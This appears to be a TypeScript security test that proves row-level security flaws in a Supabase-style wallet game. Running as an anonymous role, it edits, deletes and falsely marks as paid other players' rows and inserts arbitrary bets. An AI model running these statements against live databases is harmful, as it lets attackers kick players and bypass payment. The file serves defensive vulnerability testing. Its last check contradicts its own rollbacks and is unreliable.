/**
 * Negative security tests: prove that anon RLS policies on `players` allow
 * unauthorized modification of ANY player row.
 *
 * Run against a DISPOSABLE local Postgres (never production):
 *   docker run -d --name rls-attack -e POSTGRES_PASSWORD=postgres -p 55433:5432 postgres:16
 *   DSN=postgres://postgres:postgres@127.0.0.1:55433/postgres npx tsx tests/anon-player-attack.ts
 *
 * These tests MUST FAIL once the fix is applied (they prove the vulnerability).
 */

import { readFileSync } from "node:fs";
import pg from "pg";

const DSN = process.env.DSN ?? "postgres://postgres:postgres@127.0.0.1:55433/postgres";

let passed = 0;
let failed = 0;
function report(ok: boolean, name: string, detail = "") {
  ok ? passed++ : failed++;
  console.log(`  ${ok ? "✓" : "✗"} ${name}${detail ? `  (${detail})` : ""}`);
}

async function main() {
  const db = new pg.Client({ connectionString: DSN });
  await db.connect();

  // Setup roles and auth stub
  await db.query(`
    do $$ begin
      if not exists (select from pg_roles where rolname = 'anon') then create role anon nologin; end if;
      if not exists (select from pg_roles where rolname = 'authenticated') then create role authenticated nologin; end if;
      if not exists (select from pg_roles where rolname = 'service_role') then create role service_role nologin bypassrls; end if;
    end $$;
    create schema if not exists auth;
    create or replace function auth.role() returns text language sql stable
      as $$ select nullif(current_setting('request.jwt.claim.role', true), '') $$;
    -- auth.role() must resolve for the test roles; without USAGE it raises
    -- 42501 and a naive harness would misread that as a policy denial.
    grant usage on schema auth to anon, authenticated, service_role;
    do $$ begin
      if not exists (select from pg_publication where pubname = 'supabase_realtime') then
        create publication supabase_realtime;
      end if;
    end $$;
  `);

  // Apply migrations
  for (const f of [
    "supabase/schema.sql",
    "supabase/migrations/predictions.sql",
    "supabase/migrations/20260701_escrow_hardening.sql",
  ]) {
    await db.query(readFileSync(f, "utf8"));
    console.log(`applied ${f}`);
  }

  await db.query(`
    grant usage on schema public to anon, service_role;
    grant select, insert, update, delete on all tables in schema public to anon, service_role;
    grant execute on all functions in schema public to anon, service_role;
  `);

  // Seed: a game with two players
  const { rows: [game] } = await db.query(
    `insert into games (room_code, host_wallet, status, current_round, buy_in_lamports)
     values ('ATK001','HOSTWALLET','playing',1, 100000)
     returning id`,
  );
  await db.query(
    `insert into players (game_id, wallet_address, display_name, has_paid, is_ready)
     values ($1, 'VICTIM_WALLET', 'Victim', true, true)`,
    [game.id],
  );
  await db.query(
    `insert into players (game_id, wallet_address, display_name, has_paid, is_ready)
     values ($1, 'ATTACKER_WALLET', 'Attacker', true, true)`,
    [game.id],
  );

  async function asAnon(sql: string, params: unknown[] = []) {
    await db.query("BEGIN");
    try {
      await db.query("SET LOCAL ROLE anon");
      await db.query("SET LOCAL request.jwt.claim.role = 'anon'");

      // A failure resolving the role/auth.role() is an infra fault (e.g. 42501
      // missing USAGE on schema auth) and must abort the run — never be counted
      // as a successful "block" by a later rowCount assertion.
      let roleCheck: { cu: string; ar: string };
      try {
        const { rows } = await db.query(`SELECT current_user AS cu, auth.role() AS ar`);
        roleCheck = rows[0];
      } catch (e: any) {
        await db.query("ROLLBACK");
        throw new Error(
          `FATAL: role assertion query failed (${e.code ?? "?"}: ${e.message}). ` +
          `Fix the bootstrap (GRANT USAGE ON SCHEMA auth) before trusting results.`,
        );
      }
      if (roleCheck.cu !== "anon" || roleCheck.ar !== "anon") {
        await db.query("ROLLBACK");
        throw new Error(`FATAL: role not applied — cu=${roleCheck.cu}, ar=${roleCheck.ar}`);
      }

      try {
        const r = await db.query(sql, params);
        await db.query("ROLLBACK");
        return { ok: true, rowCount: r.rowCount ?? 0, rows: r.rows };
      } catch (e: any) {
        await db.query("ROLLBACK");
        return { ok: false, err: e.message, rowCount: 0, rows: [] };
      }
    } catch (e: any) {
      try { await db.query("ROLLBACK"); } catch {}
      throw e; // propagate FATAL infra faults
    }
  }

  // Preflight: prove the anon role machinery resolves before running attacks.
  await asAnon("SELECT 1");
  console.log("preflight: anon role assertion OK");

  console.log("\n=== VULNERABILITY PROOF: anon player manipulation ===\n");

  // 1. Anon can change another player's display_name
  let r = await asAnon(
    `update players set display_name='PWNED' where game_id=$1 and wallet_address='VICTIM_WALLET'`,
    [game.id],
  );
  report(
    r.ok && r.rowCount === 1,
    "VULN: anon changed VICTIM display_name to 'PWNED'",
  );

  // 2. Anon can set has_paid=false on another player (deny them game participation)
  r = await asAnon(
    `update players set has_paid=false where game_id=$1 and wallet_address='VICTIM_WALLET'`,
    [game.id],
  );
  report(
    r.ok && r.rowCount === 1,
    "VULN: anon set VICTIM has_paid=false (griefing — victim appears unpaid)",
  );

  // 3. Anon can set is_ready=false on another player (un-ready them)
  r = await asAnon(
    `update players set is_ready=false where game_id=$1 and wallet_address='VICTIM_WALLET'`,
    [game.id],
  );
  report(
    r.ok && r.rowCount === 1,
    "VULN: anon set VICTIM is_ready=false (griefing — victim appears not ready)",
  );

  // 4. Anon can set has_paid=true without any payment (skip payment)
  r = await asAnon(
    `update players set has_paid=true where game_id=$1 and wallet_address='ATTACKER_WALLET'`,
    [game.id],
  );
  report(
    r.ok && r.rowCount === 1,
    "VULN: anon set own has_paid=true without paying (payment bypass)",
  );

  // 5. Anon can DELETE any player row (kick anyone from any game)
  r = await asAnon(
    `delete from players where game_id=$1 and wallet_address='VICTIM_WALLET'`,
    [game.id],
  );
  report(
    r.ok && r.rowCount === 1,
    "VULN: anon deleted VICTIM player row (force-kick from game)",
  );

  // 6. Predictions: anon can insert for any game without constraint
  r = await asAnon(
    `insert into predictions (game_id, bettor_wallet, predicted_winner_wallet, amount_lamports)
     values ($1, 'ANON_BETTOR', 'ATTACKER_WALLET', 999999)`,
    [game.id],
  );
  report(
    r.ok,
    "VULN: anon inserted prediction with arbitrary amount (no game-state check)",
  );

  // 7. Verify VICTIM row is actually gone
  const { rows: remaining } = await db.query(
    `select wallet_address from players where game_id=$1`,
    [game.id],
  );
  report(
    remaining.length === 1 && remaining[0].wallet_address === "ATTACKER_WALLET",
    "CONFIRMED: victim player row deleted, only attacker remains",
    JSON.stringify(remaining.map((r: any) => r.wallet_address)),
  );

  console.log(`\n${passed} passed, ${failed} failed`);
  console.log("\nAll passing tests above prove exploitable vulnerabilities.");
  console.log("Once fixed, these tests should FAIL (anon should be denied).\n");

  await db.end();
  process.exit(0);
}

main().catch((e) => {
  console.error("attack harness failed:", e.message);
  process.exit(1);
});
